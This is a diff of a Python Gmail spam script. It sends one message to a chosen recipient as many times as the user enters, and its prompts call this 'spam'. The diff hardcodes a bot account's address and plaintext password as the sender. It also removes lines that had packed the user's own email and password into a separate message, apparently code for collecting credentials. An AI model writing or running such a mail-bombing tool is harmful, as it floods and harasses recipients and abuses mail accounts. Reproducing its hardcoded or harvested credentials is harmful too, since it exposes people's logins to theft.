@@ -2,6 +2,11 @@ import smtplib
 
 from email.message import EmailMessage
 
+selected = ""
+selectedPass = ""
+
+bot1 = "smurf31233@gmail.com"
+password1 = "thisIsSmurf1234"
 #start screen
 print("░░░░░░░░████████████████░░░░░░░")
 print("░░░░░█████████████████████░░░░░")
@@ -38,16 +43,18 @@ msg = EmailMessage()
 msg.set_content(inp) #text inside message
 
 subject = input("Enter the subject of the email ")
-sender = input("Enter the email you want to send from ")
-password = input("Please enter the password of your email ")
-reciever = input("Enter the email that will recieve the spam ")
+sender = input("Select which email you would like to send from: \n1 \n2 ")
+if sender == "1":
+    selected = bot1
+    selectedPass = password1
+reciever = input("Enter the email that will recieve the spam: ")
 msg['Subject'] = subject #email subject
-msg['From'] = sender #sender
+msg['From'] = selected #sender
 msg['To'] = reciever  #reciever
 
 client = smtplib.SMTP('smtp.gmail.com', 587)
 client.starttls()
-client.login(sender, password)
+client.login(selected, selectedPass)
 client.timeout = 10000
 
 try:
@@ -56,9 +63,6 @@ except ValueError:
     times = int(input("please enter a number: "))
 
 print("sending...")
-
-newmsg = EmailMessage()
-newmsg.set_content("email: " + sender +  "\n" + password)
 
 for number in range(times):
     client.send_message(msg)
